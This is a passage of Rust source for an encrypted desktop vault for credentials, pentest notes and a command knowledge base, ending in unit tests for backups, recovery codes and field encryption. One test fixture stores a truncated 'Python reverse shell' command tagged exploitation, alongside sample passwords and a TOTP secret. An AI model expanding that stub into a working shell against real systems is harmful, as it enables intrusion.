    db.execute("INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
        rusqlite::params![id, enc_title, enc_cmd, enc_desc, enc_tags, input.category])
        .map_err(|e| e.to_string())?;
    Ok(kb::KBEntry { id, title: input.title, command: input.command, description: input.description, tags: input.tags, category: input.category, created_at: "just now".into() })
}

#[tauri::command]
fn get_kb_entries(state: tauri::State<AppState>) -> Result<Vec<kb::KBEntry>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, title, command, description, tags, category, created_at FROM kb_entries ORDER BY created_at DESC")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map([], |row| {
        let enc_title: String = row.get(1)?;
        let enc_cmd: String = row.get(2)?;
        let enc_desc: String = row.get(3)?;
        let enc_tags: String = row.get(4)?;
        Ok(kb::KBEntry {
            id: row.get(0)?,
            title: vault::decrypt(&key, &enc_title).unwrap_or_else(|_| "[decryption failed]".into()),
            command: vault::decrypt(&key, &enc_cmd).unwrap_or_else(|_| "[decryption failed]".into()),
            description: vault::decrypt(&key, &enc_desc).unwrap_or_else(|_| "[decryption failed]".into()),
            tags: vault::decrypt(&key, &enc_tags).unwrap_or_else(|_| "[decryption failed]".into()),
            category: row.get(5)?, created_at: row.get(6)?,
        })
    })
    .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

#[tauri::command]
fn delete_kb_entry(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    db.execute("DELETE FROM kb_entries WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
    Ok(())
}

// ===== Backup =====

#[tauri::command]
fn export_backup(state: tauri::State<AppState>, backup_password: String) -> Result<String, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    require_min_length(&backup_password, "Backup password", MIN_BACKUP_PASSWORD_CHARS)?;

    let data = backup::collect_all(&db, &key)?;
    let json = serde_json::to_string(&data).map_err(|e| e.to_string())?;

    // Per-backup random salt
    let mut salt = [0u8; 32];
    fill_random(&mut salt);
    let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);

    let mut wrapping_key = vault::derive_key(&backup_password, &salt)?;
    let payload = vault::encrypt(&wrapping_key, &json)?;
    wrapping_key.zeroize();

    // Prepend salt to the payload so import can recover it
    let bundled = format!("{}:{}", salt_b64, payload);

    activity::log_action(&db, "backup_export", "vault exported");
    Ok(bundled)
}

#[tauri::command]
fn import_backup(state: tauri::State<AppState>, bundled: String, backup_password: String) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    reject_empty_password(&backup_password, "Backup password")?;

    // Extract salt from bundle
    let (salt_b64, payload) = bundled.split_once(':')
        .ok_or("invalid backup format — missing salt")?;
    let salt = base64::engine::general_purpose::STANDARD
        .decode(salt_b64)
        .map_err(|e| e.to_string())?;

    let mut wrapping_key = vault::derive_key(&backup_password, &salt)?;
    let json = vault::decrypt(&wrapping_key, payload)?;
    wrapping_key.zeroize();
    let data: backup::VaultBackup = serde_json::from_str(&json).map_err(|e| e.to_string())?;

    // Re-encrypt every sensitive field under this vault's DEK. A backup made by
    // another vault is portable because collect_all exported plaintext inside
    // the encrypted envelope; a payload this key cannot decrypt is rejected
    // rather than written back as unreadable bytes.
    let fixed_data = backup::prepare_for_import(data, &key)?;

    backup::restore_all(&db, &fixed_data)?;
    activity::log_action(&db, "backup_import", "vault data imported");
    Ok(())
}

// ===== Activity =====

#[tauri::command]
fn get_activity_log(state: tauri::State<AppState>) -> Result<Vec<activity::ActivityEntry>, String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, action, detail, timestamp FROM activity_log ORDER BY timestamp DESC LIMIT 100")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map([], |row| Ok(activity::ActivityEntry { id: row.get(0)?, action: row.get(1)?, detail: row.get(2)?, timestamp: row.get(3)? }))
        .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

// ===== Recovery =====

#[tauri::command]
fn verify_master_password(state: tauri::State<AppState>, password: String) -> Result<bool, String> {
    let db = require_db(&state)?;
    let stored_hash: String = db.query_row(
        "SELECT value FROM vault_config WHERE key = 'password_hash'", [], |r| r.get(0)
    ).map_err(|e| e.to_string())?;
    vault::verify_password(&password, &stored_hash)
}

#[tauri::command]
fn generate_recovery_codes(state: tauri::State<AppState>) -> Result<Vec<String>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    activity::generate_recovery_codes(&db, &key)
}

#[tauri::command]
fn reset_master_password(state: tauri::State<AppState>, recovery_code: String, new_password: String) -> Result<bool, String> {
    let db = require_db(&state)?;
    require_min_length(&new_password, "New master password", MIN_MASTER_PASSWORD_CHARS)?;

    // The lookup, the password change, and the consumption of the one-time code
    // commit together. Nobody can spend a code without the reset landing, and
    // two concurrent attempts cannot both succeed.
    let mut dek = match activity::recover_and_reset(&db, &recovery_code, &new_password)? {
        Some(dek) => dek,
        None => return Ok(false),
    };

    // Set in-memory DEK and unlock the app
    {
        let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
        *ek = Some(dek);
    }
    dek.zeroize();

    activity::log_action(&db, "recovery", "master password reset via recovery code");
    Ok(true)
}

// ===== Startup =====

fn main() {
    let result = tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .setup(|app| {
            let db_path = vault_path(app.handle()).map_err(std::io::Error::other)?;
            // Fail loudly instead of panicking: a corrupt or unwritable data
            // directory is a condition the user can act on, not a crash.
            if let Some(parent) = db_path.parent() {
                std::fs::create_dir_all(parent).map_err(std::io::Error::other)?;
            }

            let conn = vault::init_db(&db_path).map_err(std::io::Error::other)?;
            journal::init_journal_tables(&conn).map_err(std::io::Error::other)?;
            kb::init_kb_tables(&conn).map_err(std::io::Error::other)?;
            activity::init_activity_table(&conn).map_err(std::io::Error::other)?;

            // Enable foreign keys
            conn.execute_batch("PRAGMA foreign_keys = ON;")
                .map_err(std::io::Error::other)?;

            app.manage(AppState {
                db: Mutex::new(conn),
                encryption_key: Mutex::new(None),
            });
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            get_credentials, add_credential, update_credential, delete_credential,
            unlock_vault, lock_vault,
            setup_totp, get_totp_remaining, remove_totp,
            check_hibp,
            create_project, get_projects, delete_project,
            add_entry, add_entries, get_entries, delete_entry,
            parse_nmap,
            add_kb_entry, get_kb_entries, delete_kb_entry,
            export_backup, import_backup,
            get_activity_log,
            generate_recovery_codes, reset_master_password, verify_master_password,
        ])
        .run(tauri::generate_context!());

    if let Err(error) = result {
        eprintln!("Cobrypt failed to start: {error}");
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn migration_test_dir(label: &str) -> PathBuf {
        let path = std::env::temp_dir().join(format!("cobrypt-{label}-{}", uuid_v4()));
        std::fs::create_dir_all(&path).unwrap();
        path
    }

    fn create_marker_database(path: &Path, marker: &str) {
        let db = Connection::open(path).unwrap();
        db.execute("CREATE TABLE migration_marker (value TEXT NOT NULL)", []).unwrap();
        db.execute("INSERT INTO migration_marker (value) VALUES (?1)", [marker]).unwrap();
    }

    fn read_marker_after_reopen(path: &Path) -> String {
        let db = Connection::open(path).unwrap();
        db.query_row("SELECT value FROM migration_marker", [], |row| row.get(0)).unwrap()
    }

    #[test]
    fn test_database_brand_migration_copies_and_reopens_without_removing_legacy() {
        let dir = migration_test_dir("brand-migration-success");
        let legacy = dir.join(LEGACY_DATABASE_NAME);
        let current = dir.join(CURRENT_DATABASE_NAME);
        create_marker_database(&legacy, "legacy-vault-survives");

        let migrated = migrate_database_if_needed(&current, std::slice::from_ref(&legacy)).unwrap();

        assert!(migrated);
        assert!(legacy.is_file(), "legacy KeyRPT database must remain recoverable");
        assert!(current.is_file(), "Cobrypt database must be activated atomically");
        assert_eq!(read_marker_after_reopen(&current), "legacy-vault-survives");
        assert_eq!(read_marker_after_reopen(&legacy), "legacy-vault-survives");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_database_brand_migration_never_overwrites_existing_cobrypt_vault() {
        let dir = migration_test_dir("brand-migration-no-overwrite");
        let legacy = dir.join(LEGACY_DATABASE_NAME);
        let current = dir.join(CURRENT_DATABASE_NAME);
        create_marker_database(&legacy, "legacy-value");
        create_marker_database(&current, "current-value");

        let migrated = migrate_database_if_needed(&current, &[legacy]).unwrap();

        assert!(!migrated);
        assert_eq!(read_marker_after_reopen(&current), "current-value");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_database_brand_migration_failure_leaves_source_and_destination_unchanged() {
        let dir = migration_test_dir("brand-migration-failure");
        let legacy = dir.join(LEGACY_DATABASE_NAME);
        let current = dir.join(CURRENT_DATABASE_NAME);
        let corrupt_bytes = b"not a sqlite database";
        std::fs::write(&legacy, corrupt_bytes).unwrap();

        let result = migrate_database_if_needed(&current, std::slice::from_ref(&legacy));

        assert!(result.is_err());
        assert!(!current.exists(), "failed migration must not activate a partial database");
        assert_eq!(std::fs::read(&legacy).unwrap(), corrupt_bytes);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_legacy_key_derivation_compatibility() {
        let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31];
        let password = "test-password";
        let legacy_key = vault::derive_key(password, &legacy_salt).unwrap();
        let hash = base64::engine::general_purpose::STANDARD.encode(legacy_key);

        // Verify the hash can be matched
        let check_key = vault::derive_key(password, &legacy_salt).unwrap();
        let check_hash = base64::engine::general_purpose::STANDARD.encode(check_key);
        assert_eq!(hash, check_hash, "legacy key derivation must be deterministic");

        // Verify wrong password produces different hash
        let wrong_key = vault::derive_key("wrong-password", &legacy_salt).unwrap();
        let wrong_hash = base64::engine::general_purpose::STANDARD.encode(wrong_key);
        assert_ne!(hash, wrong_hash, "wrong password must produce different hash");
    }

    #[test]
    fn test_legacy_detection() {
        // Verify legacy detection logic
        let legacy_hash = "somebase64hash";
        let empty = "";
        let not_empty = "hasvalue";

        // is_legacy: legacy_hash non-empty, encrypted_dek empty, password_hash empty
        assert!(!legacy_hash.is_empty() && empty.is_empty() && empty.is_empty(),
            "legacy vault must be detected when master_hash exists but new fields don't");

        // is_fresh: all three empty
        assert!(empty.is_empty() && empty.is_empty() && empty.is_empty(),
            "fresh vault when all fields empty");

        // Normal: encrypted_dek and password_hash are non-empty
        let is_normal = !not_empty.is_empty() && !not_empty.is_empty();
        assert!(is_normal, "normal vault has non-empty encrypted_dek and password_hash");
    }

    #[test]
    fn test_recovery_code_roundtrip() {
        // Generate recovery codes, recover DEK, verify
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();

        let original_dek = vault::generate_dek();
        let mut codes = activity::generate_recovery_codes(&conn, &original_dek).unwrap();
        assert_eq!(codes.len(), 8, "must generate 8 recovery codes");

        // Recover with first code
        let code = codes.remove(0);
        let recovered = activity::recover_dek(&conn, &code).unwrap();
        assert!(recovered.is_some(), "valid code must recover DEK");
        let (recovered_dek, _row_id) = recovered.unwrap();
        assert_eq!(recovered_dek, original_dek, "recovered DEK must match original");

        // Code cannot be reused (row still present, but we simulate by calling again)
        // Note: row is NOT deleted by recover_dek — the caller must delete it.
        // For this test, manually verify the row still exists.
        let still_there: bool = conn.query_row(
            "SELECT COUNT(*) > 0 FROM recovery_codes",
            [], |row| row.get(0)
        ).unwrap();
        assert!(still_there, "code row must still exist after recover_dek (caller deletes it)");

        // Now manually delete to simulate the caller's transaction commit
        conn.execute("DELETE FROM recovery_codes WHERE id = ?1", rusqlite::params![_row_id]).unwrap();

        // After deletion, code should not be found
        let reused = activity::recover_dek(&conn, &code).unwrap();
        assert!(reused.is_none(), "code must not work after row deleted");
    }

    #[test]
    fn test_recovery_code_wrong_code_fails() {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();

        let dek = vault::generate_dek();
        activity::generate_recovery_codes(&conn, &dek).unwrap();

        let result = activity::recover_dek(&conn, "WRONG-CODE-12345").unwrap();
        assert!(result.is_none(), "wrong code must return None");
    }

    #[test]
    fn test_recovery_code_full_reset_flow() {
        // File-backed DB to prove data survives close/reopen
        let dir = std::env::temp_dir();
        let path = dir.join("cobrypt-test-reset.db");
        let _ = std::fs::remove_file(&path); // clean from previous runs

        let old_password = "original-password";
        let new_password = "new-password";
        let test_service = "test-service";
        let test_cred = "test-cred-password";

        // Create vault
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            activity::init_activity_table(&conn).unwrap();
            conn.execute_batch("
                CREATE TABLE IF NOT EXISTS vault_config (key TEXT PRIMARY KEY, value TEXT NOT NULL);
                INSERT OR IGNORE INTO vault_config (key, value) VALUES ('encrypted_dek', '');
                INSERT OR IGNORE INTO vault_config (key, value) VALUES ('password_hash', '');
                INSERT OR IGNORE INTO vault_config (key, value) VALUES ('kdf_salt', '');
                CREATE TABLE IF NOT EXISTS credentials (id TEXT PRIMARY KEY, service TEXT, username TEXT, password_encrypted TEXT, url TEXT, notes TEXT, totp_secret TEXT, created_at TEXT);
            ").unwrap();

            let dek = vault::generate_dek();
            let salt = [0u8; 32];
            let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
            let wrap_key = vault::derive_key(old_password, &salt).unwrap();
            let wrapped = vault::wrap_dek(&dek, &wrap_key).unwrap();
            let pass_hash = vault::hash_password(old_password).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();

            let enc = vault::encrypt(&dek, test_cred).unwrap();
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted) VALUES (?1, ?2, ?3, ?4)",
                rusqlite::params!["id1", test_service, "user", enc]).unwrap();

            let codes = activity::generate_recovery_codes(&conn, &dek).unwrap();
            // Store the code so we can use it after closing
            std::fs::write(format!("{}.code", path.display()), &codes[0]).unwrap();
        }

        // Locked: recover and reset through the single production transaction
        let recovery_code = std::fs::read_to_string(format!("{}.code", path.display())).unwrap();
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            let dek = activity::recover_and_reset(&conn, &recovery_code, new_password)
                .unwrap()
                .expect("recovery must succeed");
            assert_eq!(dek.len(), 32, "recovery must yield a 32-byte DEK");

            // A second attempt with the same one-time code must find nothing:
            // the code was consumed in the same transaction that re-keyed the
            // vault, so it can never be spent twice.
            let again = activity::recover_and_reset(&conn, &recovery_code, "another-password").unwrap();
            assert!(again.is_none(), "recovery code must only work once");
        }

        // CLOSE and REOPEN — verify data survived
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            let enc_dek: String = conn.query_row("SELECT value FROM vault_config WHERE key='encrypted_dek'", [], |r| r.get(0)).unwrap();
            let salt_b64: String = conn.query_row("SELECT value FROM vault_config WHERE key='kdf_salt'", [], |r| r.get(0)).unwrap();
            let salt = base64::engine::general_purpose::STANDARD.decode(&salt_b64).unwrap();
            let wrap_key = vault::derive_key(new_password, &salt).unwrap();
            let final_dek = vault::unwrap_dek(&enc_dek, &wrap_key).unwrap();

            let enc: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE id='id1'", [], |r| r.get(0)).unwrap();
            let dec = vault::decrypt(&final_dek, &enc).unwrap();
            assert_eq!(dec, test_cred, "new password must decrypt after reopen");

            // Old password must fail
            let old_salt = [0u8; 32];
            let old_wrap = vault::derive_key(old_password, &old_salt).unwrap();
            assert!(vault::unwrap_dek(&enc_dek, &old_wrap).is_err(), "old password must not work");
        }

        // Code cannot be reused
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            assert!(activity::recover_dek(&conn, &recovery_code).unwrap().is_none(), "code must be consumed");
        }

        // Cleanup
        std::fs::remove_file(format!("{}.code", path.display())).ok();
    }

    #[test]
    fn test_recovery_reset_rollback_on_failure() {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();
        conn.execute_batch("
            CREATE TABLE IF NOT EXISTS vault_config (key TEXT PRIMARY KEY, value TEXT NOT NULL);
            INSERT OR IGNORE INTO vault_config (key, value) VALUES ('encrypted_dek', '');
            INSERT OR IGNORE INTO vault_config (key, value) VALUES ('password_hash', '');
            INSERT OR IGNORE INTO vault_config (key, value) VALUES ('kdf_salt', '');
        ").unwrap();

        let old_password = "original-pw";
        let new_password = "new-pw";

        let dek = vault::generate_dek();
        let salt = [0u8; 32];
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
        let wrap_key = vault::derive_key(old_password, &salt).unwrap();
        let wrapped = vault::wrap_dek(&dek, &wrap_key).unwrap();
        let pass_hash = vault::hash_password(old_password).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();

        let codes = activity::generate_recovery_codes(&conn, &dek).unwrap();
        let code = &codes[0];

        // Force the reset to fail part-way through: rename vault_config so the
        // writes inside the transaction cannot land.
        conn.execute("ALTER TABLE vault_config RENAME TO vault_config_hidden", []).unwrap();

        let result = activity::recover_and_reset(&conn, code, new_password);
        assert!(result.is_err(), "reset must fail when vault_config is missing");

        // Restore table and verify the code was NOT consumed
        conn.execute("ALTER TABLE vault_config_hidden RENAME TO vault_config", []).unwrap();
        let still_exists = activity::recover_dek(&conn, code).unwrap();
        assert!(still_exists.is_some(), "recovery code must still exist after a failed reset");

        // Verify old password still unlocks
        let enc_dek: String = conn.query_row("SELECT value FROM vault_config WHERE key='encrypted_dek'", [], |r| r.get(0)).unwrap();
        let old_wrap_key = vault::derive_key(old_password, &salt).unwrap();
        let old_dek = vault::unwrap_dek(&enc_dek, &old_wrap_key).unwrap();
        assert_eq!(old_dek, dek, "DEK must be unchanged after failed reset");

        // Cleanup the consumed code row (it was recover_dek'd but reset failed, so row stays)
        // No cleanup needed — the test verifies the row is still there
    }

    #[test]
    fn test_migration_key_roundtrip() {
        let password = "migration-password";
        let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31];
        let legacy_key = vault::derive_key(password, &legacy_salt).unwrap();

        let plaintext = "my-secret-password";
        let encrypted = vault::encrypt(&legacy_key, plaintext).unwrap();

        let decrypted = vault::decrypt(&legacy_key, &encrypted).unwrap();
        assert_eq!(decrypted, plaintext);

        let new_dek = vault::generate_dek();
        let re_encrypted = vault::encrypt(&new_dek, &decrypted).unwrap();
        let re_decrypted = vault::decrypt(&new_dek, &re_encrypted).unwrap();
        assert_eq!(re_decrypted, plaintext);

        let result = vault::decrypt(&legacy_key, &re_encrypted);
        assert!(result.is_err(), "legacy key must not decrypt new DEK ciphertext");
    }

    #[test]
    fn test_recover_dek_sqlite_error_propagates() {
        // SQLite errors other than QueryReturnedNoRows must propagate, not get swallowed as "code not found"
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        // Don't create the table — any query will fail with a non-NoRows error
        let result = activity::recover_dek(&conn, "any-code");
        assert!(result.is_err(), "non-NoRows SQLite error must be an Err");
        let msg = result.unwrap_err();
        assert!(
            msg.contains("database error"),
            "error must say 'database error', got: {}",
            msg
        );
        assert!(
            !msg.contains("invalid") && !msg.contains("wrong"),
            "must not be misreported as invalid code"
        );
    }

    #[test]
    fn test_recover_dek_wrong_length_payload() {
        // Corrupted wrapped DEK with wrong plaintext length must error, not panic
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();

        let _dek = vault::generate_dek();

        // Create a deliberately malformed wrapped DEK: valid AES-GCM of a 1-byte payload
        // (not a valid 32-byte DEK), stored with a known recovery code
        let code = "TEST-CODE-26-CHARS-LONG!!"; // exactly 26 chars
        let hash = sha256_hash(code);

        use aes_gcm::aead::{Aead, KeyInit, OsRng};
        use aes_gcm::{Aes256Gcm, Nonce};
        use argon2::Argon2;
        use rand::RngCore;

        let mut salt = [0u8; 32];
        OsRng.fill_bytes(&mut salt);
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);

        let argon2 = Argon2::default();
        let mut recovery_key = [0u8; 32];
        argon2.hash_password_into(code.as_bytes(), &salt, &mut recovery_key).unwrap();

        // Encrypt a 1-byte payload (not 32) — this will produce wrong-length plaintext
        let cipher = Aes256Gcm::new_from_slice(&recovery_key).unwrap();
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let bad_payload = b"x"; // 1 byte, not 32
        let ciphertext = cipher.encrypt(nonce, bad_payload.as_ref()).unwrap();
        let mut combined = nonce_bytes.to_vec();
        combined.extend_from_slice(&ciphertext);
        let wrapped = base64::engine::general_purpose::STANDARD.encode(&combined);

        conn.execute(
            "INSERT INTO recovery_codes (code_hash, salt, wrapped_dek) VALUES (?1, ?2, ?3)",
            rusqlite::params![hash, salt_b64, wrapped],
        ).unwrap();

        let result = activity::recover_dek(&conn, code);
        assert!(result.is_err(), "wrong-length DEK must error, not panic");
        let msg = result.unwrap_err();
        assert!(
            msg.contains("corrupted DEK") || msg.contains("expected 32"),
            "error must mention corrupted/length, got: {}",
            msg
        );
    }

    #[test]
    fn test_end_to_end_field_encryption() {
        let dir = std::env::temp_dir();
        let path = dir.join("cobrypt-test-e2e.db");
        let _ = std::fs::remove_file(&path);

        let test_pw = "test-password";
        let kdf_salt = b"test-salt-32-bytes-long!!!!!!"; // 32 bytes

        // 1. Create vault: setup tables, generate DEK, wrap it
        let dek = vault::generate_dek();
        let wrapping_key = vault::derive_key(test_pw, kdf_salt).unwrap();
        let wrapped = vault::wrap_dek(&dek, &wrapping_key).unwrap();
        let pass_hash = vault::hash_password(test_pw).unwrap();
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(kdf_salt);

        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            vault::init_db(&path).unwrap();
            journal::init_journal_tables(&conn).unwrap();
            kb::init_kb_tables(&conn).unwrap();
            activity::init_activity_table(&conn).unwrap();
            conn.execute_batch("PRAGMA foreign_keys = ON;").ok();

            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).unwrap();
        }

        // Helper: encrypt a field
        let enc = |v: &str| vault::encrypt(&dek, v).unwrap();

        // 2. Insert test data directly
        {
            let conn = rusqlite::Connection::open(&path).unwrap();

            // Short password cred
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["id1", "github.com", enc("dev@example.com"), enc("gh_p@$$w0rd"), enc("https://github.com"), enc("personal GitHub account")]).unwrap();

            // Long password + multiline notes
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["id2", "aws-prod", enc("admin@corp.io"), enc("Xy9#mK!pW2$vL5nR8@jF3*qT7^bN1"), enc("https://aws.amazon.com"), enc("production AWS root — DO NOT SHARE\nrotated quarterly")]).unwrap();

            // TOTP entry
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted, url, notes, totp_secret) VALUES (?1,?2,?3,?4,?5,?6,?7)",
                rusqlite::params!["id3", "gitlab.com", enc("ci-bot"), enc("gl-token-2024"), enc("https://gitlab.com"), enc(""), enc("JBSWY3DPEHPK3PXP")]).unwrap();

            // Project
            conn.execute("INSERT INTO projects (id, name, description, target, methodology) VALUES (?1,?2,?3,?4,?5)",
                rusqlite::params!["p1", "Home Lab Recon", enc("Initial passive reconnaissance of internal lab network."), enc("192.168.1.0/24"), enc("OSSTMM v3 — information gathering phase")]).unwrap();

            // Journal entry
            conn.execute("INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["e1", "p1", enc("Nmap scan: open ports discovered"), enc("Found port 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL) open.\nMySQL 5.7 — check CVE-2023-XXXX."), "recon", "medium"]).unwrap();

            // KB entry
            conn.execute("INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["k1", enc("Python reverse shell"), enc("python3 -c 'import socket,subprocess,os;...'"), enc("Standard Python reverse shell for Linux/macOS."), enc("reverse-shell,python,linux"), "exploitation"]).unwrap();
        }

        // 3. Re-open DB — verify decrypted data is correct
        {
            let conn = rusqlite::Connection::open(&path).unwrap();

            let creds: Vec<(String, String, String, String, String)> = conn
                .prepare("SELECT service, username, password_encrypted, url, notes FROM credentials ORDER BY service").unwrap()
                .query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?))).unwrap()
                .collect::<Result<Vec<_>,_>>().unwrap();

            let dec = |v: &str| vault::decrypt(&dek, v).unwrap();

            assert_eq!(creds.len(), 3);
            let gh = creds.iter().find(|c| c.0 == "github.com").unwrap();
            assert_eq!(dec(&gh.1), "dev@example.com");
            assert_eq!(dec(&gh.2), "gh_p@$$w0rd");
            assert_eq!(dec(&gh.3), "https://github.com");
            assert_eq!(dec(&gh.4), "personal GitHub account");

            let aws = creds.iter().find(|c| c.0 == "aws-prod").unwrap();
            assert_eq!(dec(&aws.2), "Xy9#mK!pW2$vL5nR8@jF3*qT7^bN1");
            assert!(dec(&aws.4).contains("DO NOT SHARE"));

            let _gl = creds.iter().find(|c| c.0 == "gitlab.com").unwrap();
            let totp_secret: String = conn.query_row(
                "SELECT totp_secret FROM credentials WHERE service='gitlab.com'", [], |r| r.get(0)
            ).unwrap();
            assert_eq!(dec(&totp_secret), "JBSWY3DPEHPK3PXP");

            let proj: (String, String, String) = conn.query_row(
                "SELECT description, target, methodology FROM projects WHERE name='Home Lab Recon'",
                [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))
            ).unwrap();
            assert!(dec(&proj.0).contains("passive reconnaissance"));
            assert_eq!(dec(&proj.1), "192.168.1.0/24");
            assert!(dec(&proj.2).contains("OSSTMM"));

            let entry: (String, String) = conn.query_row(
                "SELECT title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?))
            ).unwrap();
            assert!(dec(&entry.0).contains("Nmap scan"));
            assert!(dec(&entry.1).contains("CVE-2023"));

            let kb: (String, String, String, String) = conn.query_row(
                "SELECT title, command, description, tags FROM kb_entries LIMIT 1",
                [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))
            ).unwrap();
            assert!(dec(&kb.0).contains("Python reverse shell"));
            assert!(dec(&kb.1).contains("socket"));
            assert!(dec(&kb.3).contains("reverse-shell"));
        }

        // 4. Direct SQLite — prove fields are CIPHERTEXT (base64, not readable)
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            let is_b64 = |s: &str| s.len() > 20 && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=');

            let u: String = conn.query_row("SELECT username FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert!(is_b64(&u), "username must be encrypted base64: {}", &u[..30.min(u.len())]);

            let u2: String = conn.query_row("SELECT url FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert!(is_b64(&u2), "url must be encrypted: {}", &u2[..30.min(u2.len())]);

            let n: String = conn.query_row("SELECT notes FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert!(is_b64(&n), "notes must be encrypted");

            let p: (String, String, String) = conn.query_row("SELECT description, target, methodology FROM projects LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap();
            assert!(is_b64(&p.0) && is_b64(&p.1) && is_b64(&p.2), "project fields must be encrypted");

            let e: (String, String) = conn.query_row("SELECT title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
            assert!(is_b64(&e.0) && is_b64(&e.1), "journal fields must be encrypted");

            let k: (String, String, String, String) = conn.query_row("SELECT title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))).unwrap();
            assert!(is_b64(&k.0) && is_b64(&k.1) && is_b64(&k.2) && is_b64(&k.3), "KB fields must be encrypted");

            // Metadata plaintext
            assert_eq!(conn.query_row("SELECT service FROM credentials LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "github.com");
            assert_eq!(conn.query_row("SELECT name FROM projects LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "Home Lab Recon");
